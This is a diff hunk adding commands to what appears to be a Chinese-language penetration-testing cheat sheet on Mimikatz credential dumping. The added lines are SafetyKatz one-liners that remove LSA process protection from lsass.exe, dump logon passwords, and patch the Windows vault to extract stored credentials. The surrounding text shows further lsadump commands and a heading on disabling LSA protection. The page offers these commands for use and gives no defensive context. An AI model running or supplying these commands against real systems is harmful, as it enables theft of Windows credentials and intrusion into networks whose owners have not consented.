@@ -85,6 +85,12 @@ lsadump::secrets
 lsadump::lsa /patch
 ```
 
+```
+.\SafetyKatz.exe "!+" "!processprotect /process:lsass.exe /remove" "sekurlsa::logonpasswords" "exit"
+
+.\SafetyKatz.exe "vault::cred /patch" "exit"
+```
+
 # 禁用LSA保护
 
 如果启用了 LSA 保护，执行“sekurlsa::logonpasswords”命令会出错。
